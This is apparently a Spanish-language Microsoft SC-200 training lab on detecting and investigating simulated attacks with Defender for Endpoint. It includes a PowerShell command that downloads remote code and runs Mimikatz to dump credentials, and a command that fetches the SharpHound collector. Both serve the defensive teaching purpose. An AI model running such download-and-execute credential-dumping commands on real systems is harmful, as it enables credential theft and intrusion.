---
lab:
  title: "Ejercicio 1: mitigación de ataques con Microsoft\_Defender para puntos de conexión"
  module: Learning Path 2 - Mitigate threats using Microsoft Defender for Endpoint
---

# Ruta de aprendizaje 2 - Laboratorio 1 - Ejercicio 2: mitigación de ataques con Microsoft Defender para puntos de conexión

## Escenario del laboratorio

![Introducción al laboratorio.](../Media/SC-200-Lab_Diagrams_Mod2_L1_Ex2_10_19.png)

Usted es un analista de operaciones de seguridad que trabaja en una empresa que está implementando Microsoft Defender para punto de conexión. El administrador tiene previsto incorporar algunos dispositivos para dar información sobre los cambios necesarios en los procedimientos de respuesta del equipo de SecOps.

Para explorar las funcionalidades de mitigación de ataques de Defender para puntos de conexión, ejecutarás dos ataques simulados.

>**Nota:** Hay disponible una **[simulación de laboratorio interactiva](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** que le permite realizar sus propias selecciones a su entera discreción. Es posible que encuentre pequeñas diferencias entre la simulación interactiva y el laboratorio hospedado, pero las ideas y los conceptos básicos que se muestran son los mismos. 


### Tarea 1: comprobar la incorporación de dispositivos

En esta tarea, confirmarás que el dispositivo se ha incorporado correctamente y crearás una alerta de prueba.

1. Si aún no está en el portal de Microsoft Defender XDR en el explorador Microsoft Edge, vaya a (https://security.microsoft.com) e inicie sesión como Administrador del inquilino.

1. En el menú de la izquierda, en el área **Recursos**, selecciona **Dispositivos**. Espere hasta que WIN1 aparezca en la página Dispositivos antes de continuar. De lo contrario, es posible que tengas que repetir esta tarea para ver las alertas que se generarán más adelante.

    >**Nota:** Si has completado el proceso de incorporación y no ves dispositivos en la lista Dispositivos después de una hora, podría indicar un problema de incorporación o conectividad.

1. Selecciona **Configuración** en la barra de menús de la izquierda. Después, en la página Configuración, selecciona **Puntos de conexión**.

1. Selecciona **Incorporación** en la sección Administración de dispositivos y asegúrate de que *"Windows 10 y 11"* esté seleccionado como sistema operativo. El mensaje *"Primer dispositivo incorporado"* ahora muestra *Completado*.

1. Desplázate hacia abajo y, en la sección *"2. Ejecutar una prueba de detección"*, copia el script de prueba de detección seleccionando el botón **Copiar**.  

1. En la barra de búsqueda de Windows de la máquina virtual WIN1, escribe **CMD** y elige **Ejecutar como administrador** en el panel derecho de la aplicación de símbolo del sistema. 

1. Cuando se muestre la ventana "Control de cuentas de usuario", selecciona **Sí** para permitir que se ejecute la aplicación. 

1. Pega el script haciendo clic con el botón derecho en las ventanas **Administrador: símbolo del sistema** y presiona **Entrar** para ejecutarlo.

    >**Nota:** la ventana se cierra automáticamente después de ejecutar el script.

### Tarea 2: ataques simulados

En esta tarea, ejecutará dos ataques *simulados* mediante *PowerShell* en *WIN1* para explorar las funcionalidades de Microsoft Defender para punto de conexión.

`Attack 1: Mimikatz - Credential Dumping`

1. En la máquina *WIN1*, escriba **Comando** en la barra de búsqueda y seleccione **Ejecutar como administrador**.

1. Copie y pegue el siguiente comando en el **Administrador: Ventana del símbolo del sistema** y presione **Entrar** para ejecutarlo.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Debería ver un mensaje indicando *Acceso denegado* y un mensaje emergente de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` mostrando *Amenazas encontradas*.

1. Salga del **Administrador: Ventana del símbolo del sistema** escribiendo **salir** y presionando **Entrar**.

`Attack 2: Bloodhound - Collection`

1. En la máquina *WIN1*, escriba **PowerShell** en la barra de búsqueda, seleccione **Windows PowerShell** y seleccione **Ejecutar como administrador**.

1. Copie y pegue los siguientes comandos en el **Administrador: Ventana del símbolo del sistema** y presione **Entrar** para ejecutarlo.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Nota:** Se recomienda copiar, pegar y ejecutar los comandos de uno en uno. Abra *Bloc de notas* y copie los comandos en un archivo temporal para hacerlo. El primer comando crea una carpeta denominada *ExternalPayloads* en la misma carpeta donde se encuentra la carpeta *Atomic Red Team*. El segundo comando descarga el archivo *SharpHound.ps1* del repositorio de GitHub *BloodHound* y lo guarda en la carpeta *ExternalPayloads*.

1. Debería ver un mensaje emergente en `Windows Security Virus and threats protection` el que se muestran las *Amenazas encontradas*.

1. Copie y pegue el siguiente comando en el **Administrador: Ventana del símbolo del sistema** y presione **Entrar** para ejecutarlo.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. Si la salida fuera *True*, el archivo de carga de malware no se habrá quitado por el Antivirus de Microsoft Defender. Si la salida fuera *False*, el archivo de carga de malware se habrá quitado por el Antivirus de Microsoft Defender. Use la tecla de dirección hacia arriba para repetir el comando hasta que la salida sea *False*.

<!---1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.

1. Select the **Tutorials** tab.

1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.

1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button. 

1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->

### Tarea 3: investigar los ataques

1. En el portal de Microsoft Defender XDR, seleccione **incidentes y alertas** en la barra de menús de la izquierda y, a continuación, seleccione **Incidentes**.

1. Hay un nuevo incidente denominado "Varias familias de amenazas detectadas en un punto de conexión" en el panel derecho. Selecciona el nombre del incidente para cargar sus detalles.

    >**Nota:** Debería ver las alertas *Bloodhound* y Mimikatz* en el panel **Alertas**. En **Activos/dispositivos**, el equipo *win1* ahora tendrá un **nivel de riesgo** con valor *Alto*.

1. Selecciona el botón **Administrar incidente** y aparecerá una nueva hoja de ventana. 

1. En **Etiquetas de incidente**, escriba "Simulación" y seleccione **Simulación (Crear nueva)** para crear una nueva etiqueta. 

1. Selecciona el botón de alternancia **Asignar a** y agrega tu cuenta de usuario (Me) como propietario del incidente. 

1. En **Clasificación**, expande el menú desplegable. 

1. En **Información, actividad esperada**, selecciona **Pruebas de seguridad**. 

1. Agrega los comentarios, si quieres, y selecciona **Guardar** para actualizar el incidente y finalizar.

1. Revisa el contenido de las pestañas *Ataque, Alertas, Activos, Investigaciones, Evidencia y Respuesta* y *Resumen*. Los dispositivos y los usuarios se encuentran en la pestaña *Recursos*. La pestaña *Historia de ataque* muestra el *Gráfico de incidentes*. **Sugerencia**: es posible que algunas pestañas estén ocultas debido al tamaño de la pantalla. Selecciona la pestaña de puntos suspensivos (...) para que aparezcan.

    >**Advertencia:** Los ataques aquí simulados son una excelente forma de aprendizaje mediante práctica. Realice solo los ataques de las instrucciones proporcionadas de este laboratorio cuando use el inquilino de Azure proporcionado por el curso.  Podrá realizar otros ataques simulados *después* de que este curso de entrenamiento se complete con este inquilino.

## Has completado el laboratorio.
